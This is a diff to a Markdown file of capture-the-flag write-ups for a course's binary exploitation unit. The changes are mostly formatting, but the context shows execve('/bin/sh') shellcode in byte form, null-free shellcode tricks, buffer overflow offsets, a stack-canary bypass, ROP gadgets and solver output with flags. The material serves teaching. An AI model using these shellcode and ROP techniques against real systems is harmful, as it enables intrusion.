@@ -9,16 +9,32 @@ All the write-ups are supposed to use this import.
 from pwn import *
 ```
 
+- [Write-up for Unit2-1](#write-up-for-unit2-1)
+
+  - [1-shellcode-32](#1-shellcode-32)
+  - [2-shellcode-64](#2-shellcode-64)
+  - [3-nonzero-shellcode-32](#3-nonzero-shellcode-32)
+  - [4-nonzero-shellcode-64](#4-nonzero-shellcode-64)
+  - [5-short-shellcode-64](#5-short-shellcode-64)
+  - [6-stack-cookie](#6-stack-cookie)
+  - [7-dep-0](#7-dep-0)
+  - [8-dep-1](#8-dep-1)
+
 ## 1-shellcode-32
 
 The problem statement is below.
 
-```md
+`````md
 Write a 32-bit shellcode that runs:
-    setregid(getegid(), getegid())
-    execve("/bin/sh", 0, 0);
-and put the shellcode binary (shellcode.bin) into this directory.
+
+```c
+setregid(getegid(), getegid())
+execve("/bin/sh", 0, 0);
 ```
+
+and put the shellcode binary (shellcode.bin) into this directory.
+
+````
 
 The solution seems straightforward. Write assembly to execute the command above.
 
@@ -55,7 +71,7 @@ mov     edx, 0
 int     0x80
 """
 )
-```
+````
 
 This is the code to run the assembly.
 
@@ -79,12 +95,17 @@ CS6332{execve_bin_sh}
 
 The problem statement is below.
 
-```md
+````md
 Write a 64-bit shellcode that runs:
-    setregid(getegid(), getegid())
-    execve("/bin/sh", 0, 0);
-and put the shellcode binary (shellcode.bin) into this directory.
+
+```c
+setregid(getegid(), getegid())
+execve("/bin/sh", 0, 0);
 ```
+
+and put the shellcode binary (shellcode.bin) into this directory.
+````
+`````
 
 The only difference from `1-shellcode-32` is that this problem uses 64-bit program. Bear it in mind and solve it.
 
@@ -151,15 +172,21 @@ CS6332{exEcvE_b1n_5h
 
 The problem statement is below
 
-```md
+````md
 Write a 32-bit shellcode that runs:
-    setregid(getegid(), getegid())
-    execve("/bin/sh", 0, 0);
+
+```c
+setregid(getegid(), getegid())
+execve("/bin/sh", 0, 0);
+```
+````
+
 and put the shellcode binary (shellcode.bin) into this directory.
 
 Your shellcode must not have zero byte.
 Check that with make objdump and make print. No 00 or \x00!
-```
+
+````
 
 The problem here is how to write `mov <register> <immediate_value>`
 
@@ -168,7 +195,7 @@ For example, the `mov eax, 0x32` contains `0x00`, i.e., a zero byte.
 ```bash
 >>> asm("mov eax, 0x32")
 b'\xb82\x00\x00\x00'
-```
+````
 
 We can do it using `xor` and `add`. In the above case, we can write like this.
 
@@ -222,7 +249,7 @@ io.interactive()
 You get the flag.
 
 ```bash
-TXK220008@ctf-vm1:~/unit2/3-nonzero-shellcode-32$ ./solve3.py 
+TXK220008@ctf-vm1:~/unit2/3-nonzero-shellcode-32$ ./solve3.py
 b'1\xc0\x83\xc02\xcd\x80\x89\xc3\x89\xc11\xc0\x83\xc0G\xcd\x801\xc0\x83\xc0\x0bRhn/shh//bi\x89\xe31\xc91\xd2\xcd\x80'
 [+] Starting local process './3-nonzero-shellcode-32': pid 12180
 [*] Switching to interactive mode
@@ -235,15 +262,19 @@ CS6332{push_aNd_X0R}
 
 The problem statement is below.(fixed typo)
 
-```md
+````md
 Write a 32-bit shellcode that runs:
-    setregid(getegid(), getegid())
-    execve("/bin/sh", 0, 0);
+
+```c
+setregid(getegid(), getegid())
+execve("/bin/sh", 0, 0);
+```
+
 and put the shellcode binary (shellcode.bin) into this directory.
 
 Your shellcode must not have zero byte.
 Check that with make objdump and make print. No 00 or \x00!
-```
+````
 
 Basically, the same as 32-bit version.
 
@@ -397,7 +428,7 @@ io.interactive()
 Then, you get the flag.
 
 ```bash
-TXK220008@ctf-vm1:~/unit2/5-short-shellcode-64$ ./solve5.py 
+TXK220008@ctf-vm1:~/unit2/5-short-shellcode-64$ ./solve5.py
 [DEBUG] cpp -C -nostdinc -undef -P -I/usr/local/lib/python3.8/dist-packages/pwnlib/data/includes /dev/stdin
 [DEBUG] Assembling
     .section .shellcode,"awx"
@@ -440,8 +471,8 @@ Please break GCC ProPolice. I know beavers knew how to crack this.
 
 First, execute `checksec`. Now, we know the program has a canary and doesn't use PIE.
 
-``` bash
-TXK220008@ctf-vm1:~/unit2/6-stack-cookie$ checksec 6-stack-cookie 
+```bash
+TXK220008@ctf-vm1:~/unit2/6-stack-cookie$ checksec 6-stack-cookie
 [*] '/home/TXK220008/unit2/6-stack-cookie/6-stack-cookie'
     Arch:     i386-32-little
     RELRO:    Partial RELRO
@@ -550,7 +581,7 @@ pwndbg> info frame
 Stack level 0, frame at 0xffffd1f0:
  eip = 0x804867c in input_func; saved eip = 0x80486db
  called by frame at 0xffffd220
- Arglist at 0xffffd1e8, args: 
+ Arglist at 0xffffd1e8, args:
  Locals at 0xffffd1e8, Previous frame's sp is 0xffffd1f0
  Saved registers:
   ebp at 0xffffd1e8, eip at 0xffffd1ec
@@ -674,7 +705,7 @@ pwndbg> info frame
 Stack level 0, frame at 0xffffd220:
  eip = 0x804855c in input_func; saved eip = 0x8048579
  called by frame at 0xffffd250
- Arglist at 0xffffd218, args: 
+ Arglist at 0xffffd218, args:
  Locals at 0xffffd218, Previous frame's sp is 0xffffd220
  Saved registers:
   ebx at 0xffffd214, ebp at 0xffffd218, eip at 0xffffd21c
@@ -687,8 +718,8 @@ Stack level 0, frame at 0xffffd220:
 We know 140 bytes are needed to make its buffer overflow.
 
 ```gdb
-pwndbg> 
-Please type your name: 
+pwndbg>
+Please type your name:
 00000000111111112222222233333333444444445555555566666666777777778888888899999999000000001111111122222222333333334444444455555555666666667777111
 ```
 
@@ -732,7 +763,7 @@ io.interactive()
 After the execution, we get the flag.
 
 ```bash
-TXK220008@ctf-vm1:~/unit2/7-dep-0$ ./solve7.py 
+TXK220008@ctf-vm1:~/unit2/7-dep-0$ ./solve7.py
 [+] Starting local process './7-dep-0': pid 20760
 [*] Switching to interactive mode
 Hello aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb0\xad\xe3\xf7ABCD+\xbb\xf5\xf7
@@ -779,7 +810,7 @@ pwndbg> info frame
 Stack level 0, frame at 0xffffd210:
  eip = 0x80488cc in input_func; saved eip = 0x8048908
  called by frame at 0xffffd240
- Arglist at 0xffffd208, args: 
+ Arglist at 0xffffd208, args:
  Locals at 0xffffd208, Previous frame's sp is 0xffffd210
  Saved registers:
   ebx at 0xffffd204, ebp at 0xffffd208, eip at 0xffffd20c
@@ -794,7 +825,7 @@ pwndbg> info frame
 Stack level 0, frame at 0xffffd240:
  eip = 0x8048908 in non_main_func; saved eip = 0x8048923
  called by frame at 0xffffd260
- Arglist at 0xffffd238, args: 
+ Arglist at 0xffffd238, args:
  Locals at 0xffffd238, Previous frame's sp is 0xffffd240
  Saved registers:
   ebp at 0xffffd238, eip at 0xffffd23c
@@ -818,8 +849,8 @@ By the way, we can find a function that calls `<__libc_open>` in `some_function`
  804889f:	68 68 b2 0b 08       	push   $0x80bb268
  80488a4:	e8 27 4a 02 00       	call   806d2d0 <__libc_open>
  80488a9:	83 c4 10             	add    $0x10,%esp
- 80488ac:	c9                   	leave  
- 80488ad:	c3                   	ret    
+ 80488ac:	c9                   	leave
+ 80488ad:	c3                   	ret
 ```
 
 In `some_function`, `0x08048894`, there is a call of `<__libc_open>`, which takes `0x0` and `0x80bb268` as its arguments. What is `0x80bb268`? gdb tells us that it's `a.txt`. Symlinking `a.txt` to `flag` helps us to open the flag.
@@ -857,8 +888,8 @@ Moreover, we have the addresses to read and write in `input_func`.
  80488e4:	e8 f7 64 00 00       	call   804ede0 <_IO_printf>
  80488e9:	31 c0                	xor    %eax,%eax
  80488eb:	8b 5d fc             	mov    -0x4(%ebp),%ebx
- 80488ee:	c9                   	leave  
- 80488ef:	c3                   	ret    
+ 80488ee:	c9                   	leave
+ 80488ef:	c3                   	ret
 ```
 
 The remaining question is how to call them.
@@ -876,7 +907,7 @@ We get `pop3_ret` for it. Insert this function after calling `__libc_read`, you 
 Then, we get the flag.
 
 ```bash
-TXK220008@ctf-vm1:~/unit2/8-dep-1$ ./solve8.py 
+TXK220008@ctf-vm1:~/unit2/8-dep-1$ ./solve8.py
 [+] Starting local process './8-dep-1': pid 11161
 [DEBUG] Received 0x18 bytes:
     b'Please type your name: \n'
